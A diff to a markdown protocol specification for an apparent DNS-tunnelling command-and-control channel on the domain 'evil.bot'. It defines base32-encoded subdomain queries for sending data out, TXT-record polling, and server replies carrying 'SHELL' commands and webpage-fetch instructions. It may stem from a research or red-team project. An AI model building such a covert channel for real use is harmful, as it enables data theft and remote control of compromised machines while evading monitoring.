@@ -7,6 +7,7 @@ evil.bot
 ## ENCODING
 
 - Data: Base32 in subdomain
+  - The whole data block is one base32 String (minimum padding)
 - Commands: Plaintext
 - ClientID: Plaintext
 
@@ -21,18 +22,24 @@ evil.bot
 #### Request ID
 
 - Polling ohne id
-- request_id.evil.bot
+- requestid.evil.bot
 
 #### Data
 - send data to server
-- 0.\<base32>\<data>.[...].\<base32>\<data>.data.\<ClientID>.evil.bot
+
+##### Head
+- 0.\<base32>\<data>.[...].\<base32>\<data>.head.data.\<ClientID>.evil.bot
+
+#### Body
+
+- 0.\<base32>\<data>.[...].\<base32>\<data>.body.data.\<ClientID>.evil.bot
 
 ### TXT
 
 #### Poll
 
 - polling
-- poll.<CLientID>.evil.bot
+- poll.\<ClientID>.evil.bot
 
 #### Continue
 
@@ -42,7 +49,7 @@ evil.bot
 #### Curl
 
 - curl a webpage
-- 0.\<base32>\<webpage>.[...].\<base32>\<webpage>.curl.\<CLientID>.evil.bot
+- 0.\<base32>\<webpage>.[...].\<base32>\<webpage>.curl.\<ClientID>.evil.bot
 
 
 ## SEQUENCE DIAGRAM
@@ -58,11 +65,11 @@ evil.bot
 
 #### Request ID
 
-- \<random>.\<random>.\<random>.\<ClientID>
+- 10.\<random>.\<random>.\<ClientID>
 
 #### Data
 
-- \<random>.\<random>.\<random>.\<random>
+- \<random != 10>.\<random>.\<random>.\<random>
 
 ### TXT
 
@@ -74,11 +81,11 @@ evil.bot
 
 ##### Data
 
-- \<base64?>\<data>
+- DATA\<space>\<data>
 
 ##### shell command
 
-- \<base64?>\<command>
+- SHELL\<space>\<command>
 
 
 #### Continue
@@ -89,6 +96,10 @@ evil.bot
 
 ##### Data
 
-- \<base64?>\<data>
+- \<data>
+
+##### shell command
+
+- \<command>
 
 ## SEQUENCE DIAGRAM
